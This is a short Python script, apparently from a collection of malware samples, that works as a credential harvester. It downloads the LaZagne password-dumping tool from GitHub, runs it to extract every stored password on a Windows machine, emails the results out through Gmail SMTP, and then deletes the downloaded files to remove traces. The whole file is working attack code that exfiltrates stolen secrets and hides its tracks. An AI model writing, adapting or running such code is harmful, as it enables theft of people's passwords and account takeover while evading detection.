#!usr/bin/env python
import smtplib, requests, os, tempfile, subprocess, zipfile
import malwares.send_mail.send_mail as mail 

def send_mail(mail, password, message)->bool:
    '''
    description: sends mail to self using gmail smtp.
    params: mail, password, message
    returns: bool
    '''
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, mail, message)
        server.quit()
        return True
    except smtplib.SMTPException as e:
        print('[-] Exception : ', e)
        return False


def download(url:str)->bool:
    '''
    description: downloads file from the url.
    params: url
    returns: bool
    '''
    try:
        response = requests.get(url)
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as dfile:
            dfile.write(response.content)
        return True
    except Exception as e:
        print('[-] Exception : ', e)
        return False


def run(email, password):
    '''
    starts collecting data and report to specified email.
    '''
    tmp_dir = tempfile.gettempdir()
    os.chdir(tmp_dir)
    # download LaZagne
    download(r'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip')
    with zipfile.ZipFile('Windows.zip', 'r') as zip_file:
        zip_file.extractall(tmp_dir)

    os.chdir('Windows')
    recovered_report = subprocess.call('laZagne_x86.exe all')
    print(recovered_report)

    report = subprocess.check_output('lazagne.exe all -vv')
    msg = 'Subject: Credential Harvester Report.\n' + report
    mail.send_mail_to(email, email, password, msg)

    # remove traces
    cwd = os.getcwd()
    for file in os.listdir(cwd):
        file_dir = os.path.join(cwd,file)
        os.remove(file_dir)

    os.chdir('..')
    os.rmdir('Windows')
    os.remove('Windows.zip')


if __name__ == '__main__':
    run('youremail@gmail.com', 'yourpassword')
    